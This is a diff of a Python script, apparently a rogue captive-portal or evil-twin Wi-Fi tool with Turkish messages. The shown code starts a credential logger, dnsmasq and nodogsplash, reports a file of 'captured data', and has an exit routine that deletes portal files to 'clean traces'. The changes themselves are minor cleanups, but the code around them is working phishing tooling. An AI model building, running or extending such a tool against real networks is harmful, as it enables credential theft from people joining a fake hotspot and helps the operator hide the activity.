@@ -62,7 +62,7 @@ def check_dependencies():
         print(f"  3. GitHub üzerinden manuel kurulum için her aracın kendi dökümantasyonuna bakın.")
         sys.exit(1)
 
- --- OTOMATIK PORTAL VE CONFIG KURULUMU ---
+# --- OTOMATIK PORTAL VE CONFIG KURULUMU ---
 def setup_portal_files():
     if not os.path.exists(LOCAL_PORTAL):
         print(f"{RED}[!] HATA: '{LOCAL_PORTAL}' klasörü bulunamadı!{NC}")
@@ -143,7 +143,6 @@ def clean_exit(sig, frame):
     subprocess.run(["sudo", "pkill", "-9", "-f", "logger.py"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "pkill", "-9", "dnsmasq"], stdout=DEVNULL, stderr=DEVNULL)
     
-    # IZLERI TEMIZLE & CONFIG GERI YUKLE
     subprocess.run(["sudo", "rm", "-rf", NDS_HTDOCS], stdout=DEVNULL, stderr=DEVNULL)
     if os.path.exists(NDS_CONFIG + ".bak"):
         subprocess.run(["sudo", "mv", NDS_CONFIG + ".bak", NDS_CONFIG], stdout=DEVNULL, stderr=DEVNULL)
@@ -156,9 +155,6 @@ def clean_exit(sig, frame):
     print(f"    - Ele geçirilen veriler: {PASS_FILE}")
     print(f"{GREEN}[+] Bitti.{NC}")
     sys.stdout.flush()
-    
-    os._exit(0)
-    
     os._exit(0)
 
 signal.signal(signal.SIGINT, clean_exit)
@@ -224,7 +220,6 @@ def run():
     time.sleep(5) 
     setup_html_gateway_fix()
     
-    # Servisleri Başlat
     subprocess.Popen(["sudo", "python3", LOGGER_PATH], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     subprocess.run(["sudo", "systemctl", "restart", "dnsmasq"], stderr=subprocess.DEVNULL)
     subprocess.run(["sudo", "pkill", "nodogsplash"], stderr=subprocess.DEVNULL)
